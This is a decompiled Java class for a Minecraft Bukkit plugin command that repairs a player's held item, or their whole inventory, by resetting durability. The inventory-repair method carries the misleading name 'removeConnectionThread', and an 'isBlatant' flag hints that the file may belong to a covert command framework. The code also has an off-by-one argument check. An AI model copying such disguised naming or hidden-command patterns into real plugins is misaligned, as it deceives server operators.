/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.ItemStack
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

public class FixCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length >= 1 && args[1].equals("*")) {
            this.removeConnectionThread(p2);
            p2.sendMessage(Settings.PREFIX("All the items in your inventory have been repaired!"));
        } else {
            ItemStack item = p2.getItemInHand();
            if (item.getType() == Material.AIR) {
                p2.sendMessage(Settings.PREFIX("You aren't holding anything!"));
            } else {
                try {
                    item.setDurability((short)0);
                    p2.sendMessage(Settings.PREFIX("Your item is now max durability!"));
                }
                catch (Exception e2) {
                    p2.sendMessage(Settings.PREFIX("This item cannot be repaired!"));
                }
            }
        }
    }

    public void removeConnectionThread(Player p2) {
        for (int i2 = 0; i2 <= 36; ++i2) {
            try {
                p2.getInventory().getItem(i2).setDurability((short)0);
                continue;
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

